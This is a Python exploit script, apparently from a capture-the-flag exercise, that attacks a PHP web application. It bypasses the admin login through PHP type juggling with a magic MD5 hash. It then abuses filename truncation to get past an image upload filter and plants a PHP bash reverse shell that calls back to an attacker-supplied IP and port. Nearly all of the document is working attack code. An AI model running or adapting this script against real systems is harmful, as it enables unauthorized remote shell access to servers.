#!/usr/bin/python3
# Creator: brutuspt

import requests
import argparse
import os, sys
import hashlib
import http.server
import threading
import socketserver
from bs4 import BeautifulSoup
import re


parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument("-t", "--target", help="Target Domain Name/IP", required=True)
parser.add_argument("-i", "--IP", help="Attacker IP (Where to catch the rev shell)", required=True)
parser.add_argument("-p", "--port", help="Attacker Port (Where to catch the rev shell)", required=True)
parser.add_argument("-w", "--webport", help="Port responsible for running the webserver", required=True)


args = parser.parse_args()

s = requests.Session()

"""
We are going to skip some exploitation steps, which were made by additional tools:
    - sqlmap helped us exploiting a vulnerability on the login form and extract the users and passwords
    - Users: chris and admin
    - from chris, we managed to crack his password: 'juggling'
    - from the admin, we only got a md5 hash: '0e462096931906507119562988736854'

After logging in with the chris user, we saw some possible references to Type Juggling vulnerability
And the admin's md5 password hash starts with 0e... , so we went for it
"""

def login_as_admin(target):
    
    url = "http://%s/login.php" % target

    # the md5 hash of the submitted value must start with e0xxx
    # for example: 240610708 => md5 hash => 0e462097431906509019562988736854
    typejuggling_password = "240610708"
    password_md5hash = hashlib.md5(typejuggling_password.encode())

    if password_md5hash.hexdigest()[0:2] == "0e":
        print("[INFO] Initiating the process of finding the perfect password to exploit the PHP Type Juggling... Looks like " + typejuggling_password + " might be able to bypass the Authentication!")
    

    data = { "username" : "admin", "password" : typejuggling_password }
    #proxies = { "http" : "127.0.0.1:8080" }
    
    #s = requests.Session()
    r = s.post(url, data=data) # proxies=proxies
    
    if "Login Successful!" in r.text:
        print("[SUCCESS] We managed to login as admin with the PHP Type Juggling payload: " + str(typejuggling_password))
    else:
        print("[ERROR] Login Failed!")
        sys.exit(1)


def perfect_filename():
    # perfect length: 240
    # Linux has a maximum of character length for files: 255... "Know your limits"
    # We need to make it cut the part of the payload we want to bypass, the image file extension
    php_extension = ".php"
    image_extension = ".jpg"
    perfect_payload_name = (240-len(php_extension)-len(image_extension))*"a"+php_extension+image_extension
    print("[INFO] Finding the perfect filename to bypass the image upload filter... ")
    return perfect_payload_name


def create_server():
    
    handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer((args.IP, int(args.webport)), handler)
    print("Serving our PHP payload here: http://%s:%s" % (args.IP, args.webport))
    httpd.serve_forever()



def serve_payload(filename, ip, port):
    # create a file
    f = open(filename, "w")

    # attach the PHP reverse shell payload
    php_payload = "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/" + str(ip) + "/" + str(port) + " 0>&1'\");"
    f.write(php_payload)
    f.close()
    if os.path.exists(filename):
        print("[SUCCESS] File " + filename + " was created!")
    else:
        print("[ERROR] It was not possible to create the file :(")
    
    threading.Thread(target=create_server).start()


def upload_shell(target, filename, ip, port):

    upload_url = "http://%s/upload.php" % target
    payload_url = "http://%s:%s/%s" % (ip, str(args.webport), filename)

    data = { "url" : payload_url }
    #proxies = { "http" : "127.0.0.1:8080" }
    
    #s = requests.Session()
    r = s.post(upload_url, data=data) # proxies=proxies
    
    if "Trying to shorten..." in r.text:
        print("[SUCCESS] We managed to upload our reverse shell with the perfect maximum length")
    else:
        print("[ERROR] Upload Failed")
        sys.exit(1)

    # find the random directory where the file was uploaded
    print("[INFO] Trying to find the directory where the file was uploaded...")
    soup = BeautifulSoup(r.text)
    random_directory = soup(text=re.compile("/uploads/"))[0].split(";")[0][-26:]
    print("[SUCCESS] Found the random directory where our shell was uploaded: " + str(random_directory))

    print("[INFO] Visiting our uploaded shell...")
    # used the already trimmed filename in order to call our reverse shell
    visit_payload = "http://%s/uploads/%s/%s" % (target, random_directory, filename[:-4])
    print("[SUCCESS] Reverse shell executed, check your callback at " + str(ip) + ":" + str(port) + " ;)")
    s.get(visit_payload)
    


def main():
    login_as_admin(args.target)
    perfect = perfect_filename()
    serve_payload(str(perfect), args.IP, args.port)
    upload_shell(args.target, str(perfect), args.IP, args.port)


if __name__ == "__main__":
    main()
